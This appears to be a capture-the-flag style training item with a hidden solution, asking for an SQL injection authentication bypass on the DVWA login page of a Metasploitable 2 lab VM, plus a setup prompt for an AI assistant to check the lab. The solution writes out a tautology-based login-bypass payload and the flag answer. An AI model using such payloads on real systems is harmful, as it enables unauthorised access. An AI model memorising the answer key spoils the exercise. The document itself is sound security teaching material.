# Q066 — DVWA Login SQLi

| Field | Value |
|---|---|
| **Target** | `192.168.52.129` (Metasploitable 2) |
| **Domain** | 12 — Web Apps / 13 — SQLi |
| **Difficulty** | 🟢 Easy |
| **Tools** | `curl (or browser)` |
| **Time budget** | 15–25 min |

---

## 📝 Question

On DVWA login page (`http://192.168.52.129/dvwa/login.php`), bypass auth using SQL injection. Provide the **payload** in username and password fields.

---

## 🎯 Flag Format

```
user=<payload>; pass=<payload>
```

Example: `user=admin' OR '1'='1' --; pass=anything`

**⚠️ Format strict hai** — lowercase, no spaces around `=`, semicolon separator where shown.

---

## 💡 Hints

<details>
<summary>Hint 1 (click)</summary>

Tautology-based SQLi.
</details>

<details>
<summary>Hint 2</summary>

DVWA accepts default `admin:password` — but SQLi works too.
</details>

---

## ✅ Solution

<details>
<summary>Show solution</summary>

```bash
# Browse http://192.168.52.129/dvwa/login.php
# Username: admin' OR '1'='1' -- -
# Password: x
```

Bypasses authentication.

**Answer:** `user=admin' OR '1'='1' -- -; pass=x`

📖 Ref: [playbooks/sqli-playbook.md](../../playbooks/sqli-playbook.md)
</details>

---

## 🤖 Claude Setup Prompt (for Claude-on-your-PC)

```
Pre-requisites for Q066:
1. Verify Metasploitable2 (192.168.52.129) up; apache2+mysql running.
2. DVWA login page reachable: curl -s http://192.168.52.129/dvwa/login.php must return login HTML.
3. DVWA database initialized (first-run: browse /dvwa/setup.php → Create/Reset Database).
4. No cookie/security setup needed for login-page SQLi (it's on login itself).

Report back: "Lab ready for Q066 — DVWA login page reachable at http://192.168.52.129/dvwa/login.php".
```
